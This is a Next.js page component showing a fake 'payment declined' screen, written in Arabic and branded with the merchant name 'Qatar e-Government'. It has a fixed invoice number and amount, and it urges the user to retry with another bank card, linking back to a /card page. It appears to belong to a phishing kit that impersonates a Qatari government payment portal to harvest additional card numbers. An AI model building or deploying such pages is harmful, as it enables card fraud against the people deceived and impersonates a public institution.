"use client";
import Image from 'next/image'
import { useRouter } from "next/navigation";

export default function Err() {
  
  const router = useRouter();
  
  const handleSubmit = () => {
    
          router.push('/card');
  }
  
  return (
    <div className="flex flex-col items-center pt-2 h-screen space-y-4 bg-gray-100">
    <div className="max-w-xl bg-white rounded-lg shadow-md p-3 flex flex-row-reverse text-center">
      
      {/* العمود الأول */}

      <div className="flex-1 border-r border-[#d81b60] px-2">
        <p className="text-xs text-gray-600">رقم الفاتورة</p>
        <p className="text-xs font-bold">20000743399</p>
      </div>

      {/* العمود الثاني */}
      <div className="flex-1 border-r border-[#d81b60] px-2">
        <p className="text-xs text-gray-600">مبلغ المعاملة</p>
        <p className="text-xs font-bold">100.00 QAR</p>
      </div>

      {/* العمود الثالث */}
      <div className="flex-1 border-r border-[#d81b60] px-2">
        <p className="text-xs text-gray-600">اسم التاجر</p>
        <p className="text-xs font-bold">Qatar e-Government</p>
      </div>
      <div className="flex-1">
            </div>
    </div>    
      <div className="p-6 w-full max-w-sm flex flex-col items-center justify-center text-center">
        <div className="mb-8 flex flex-col items-center justify-center">
          <p className="text-md font-semibold text-red-700">
تم رفض عملية الدفع الخاصة بكم الرجاء محاولة الدفع عن طريق بطاقة بنكية أخرى
          </p>
        <div className="relative w-[40%] h-[100px] mb-4 mt-4">      
          <Image 
           src="/retirer.png"
           fill>
          </Image>
        </div>            
        </div>
                  <button
            type="submit"
            onClick={handleSubmit}
            className="w-full bg-[#c81048] text-white font-medium py-2 px-4 rounded-lg hover:bg-red-700 focus:ring-4 focus:ring-[#d81b60]"
          >الرجوع إلى صفحة الدفع</button>
     </div>
    </div>
  );
}
